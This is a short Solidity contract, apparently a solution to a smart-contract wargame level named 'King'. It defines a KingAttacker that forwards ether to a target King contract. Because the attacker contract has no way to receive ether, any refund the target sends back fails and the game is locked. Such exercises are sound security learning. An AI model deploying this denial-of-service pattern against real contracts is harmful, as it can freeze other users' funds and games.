// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./King.sol";
import "hardhat/console.sol";

contract KingAttacker {
    address payable target;

    constructor(address _target) {
        target = payable(_target);
    }

    function attack() public payable {
        (bool result, ) = payable(target).call{
            value: msg.value,
            gas: gasleft()
        }("");
    }
}
